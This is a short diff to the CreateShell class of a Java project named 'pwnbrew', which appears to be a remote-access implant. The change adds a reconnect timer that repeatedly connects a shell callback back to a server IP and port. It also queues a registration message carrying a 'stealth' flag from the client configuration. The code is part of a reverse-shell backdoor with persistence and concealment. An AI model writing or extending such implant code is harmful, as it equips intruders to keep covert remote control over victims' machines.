@@ -49,12 +49,15 @@ import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.List;
 import pwnbrew.ClientConfig;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.utilities.Constants;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ControlOption;
+import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.shell.Shell;
 import pwnbrew.network.shell.ShellConnectionCallback;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -168,9 +171,26 @@ public final class CreateShell extends ControlMessage {
         Shell aShell = new Shell( Constants.Executor, passedManager, 
                     theClientId, encoding, cmdString, startupCmd, currentDir,redirectStderr );
         
+        
+        //Create the Timer
+        OutgoingConnectionManager theOCM = aPR.getConnectionManager();
+        int channelId = theOCM.getNextChannelId();
+        ReconnectTimer aReconnectTimer = new ReconnectTimer(passedManager, channelId); 
+        byte stlth_val = 0;
+        if( theConf.useStealth() )
+            stlth_val = 1;   
+        
+        //Queue register message
+        RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, channelId);
+        aReconnectTimer.setPostConnectMessage(aMsg);
+        
         //Create the shell callback
-        ShellConnectionCallback aSCC = new ShellConnectionCallback(serverIp, socketPort, passedManager, aShell);
-        aPR.ensureConnectivity( aSCC );   
+        ShellConnectionCallback aSCC = new ShellConnectionCallback(serverIp, socketPort, passedManager, aShell, aReconnectTimer);
+//        aPR.ensureConnectivity( aSCC );   
+        aReconnectTimer.setConnectionCallback(aSCC);
+        
+        //Start the timer
+        aReconnectTimer.start();
         
     }
 
